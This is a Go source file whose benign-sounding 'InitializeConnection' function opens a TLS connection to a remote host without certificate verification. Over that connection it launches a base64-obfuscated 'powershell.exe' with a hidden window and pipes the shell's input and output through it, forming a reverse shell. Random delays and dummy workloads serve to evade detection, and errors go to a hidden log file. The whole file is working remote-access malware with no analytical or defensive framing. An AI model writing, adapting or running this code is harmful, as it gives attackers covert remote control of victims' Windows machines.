package network

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	mathRand "math/rand"
	"os"
	"os/exec"
	"syscall"
	"time"
)

func InitializeConnection(serverAddress string, serverPort int) error {
	// Set up the TLS connection configuration
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
	}

	// Perform some preparatory work before establishing the connection
	simulateWorkload()
	simulateProcessingTime()

	// Establish the TLS connection
	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", serverAddress, serverPort), tlsConfig)
	if err != nil {
		logToFileOrRemoteServer(fmt.Sprintf("Connection initialization failed with error: %s\n", err))
		return err
	}
	defer conn.Close()

	// Add a brief pause to simulate normal processing time
	simulateProcessingTime()

	// Execute the system command through the connection
	return runSystemCommand(conn)
}

func runSystemCommand(conn *tls.Conn) error {
	// Perform some preparatory work before running the command
	simulateWorkload()
	simulateProcessingTime()

	// The command to be executed on the system
	encodedCmd := "cG93ZXJzaGVsbC5leGU=" // Base64
	decodedCmd, err := base64.StdEncoding.DecodeString(encodedCmd)
	if err != nil {
		logToFileOrRemoteServer(fmt.Sprintf("Failed to decode command: %s\n", err))
		return err
	}

	// Set up the command and redirect input/output to the TLS connection
	cmd := exec.Command(string(decodedCmd))
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Perform additional processing before running the command
	simulateWorkload()
	simulateProcessingTime()

	// Run the system command
	if err := cmd.Run(); err != nil {
		logToFileOrRemoteServer(fmt.Sprintf("System command execution failed: %s\n", err))
		return err
	}

	return nil
}

func logToFileOrRemoteServer(message string) {
	// Perform some processing before logging
	simulateWorkload()

	// Log the activity to a hidden file
	f, err := os.OpenFile(".hidden_log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		f.WriteString(message + "\n")
		f.Close()
	}

	// Finalize the logging process with additional work
	simulateWorkload()
}

// Simulate workload to mimic natural processing and reduce predictability
func simulateWorkload() {
	size := mathRand.Intn(1024)
	workload := make([]byte, size)
	_, err := rand.Read(workload)
	if err != nil {
		logToFileOrRemoteServer(fmt.Sprintf("Failed to generate simulated workload: %s\n", err))
	}
	_ = fmt.Sprintf("Simulated workload data: %x", workload)
}

// Simulate processing time to replicate normal delays in execution flow
func simulateProcessingTime() {
	time.Sleep(time.Duration(1+mathRand.Intn(10)) * time.Second)
}
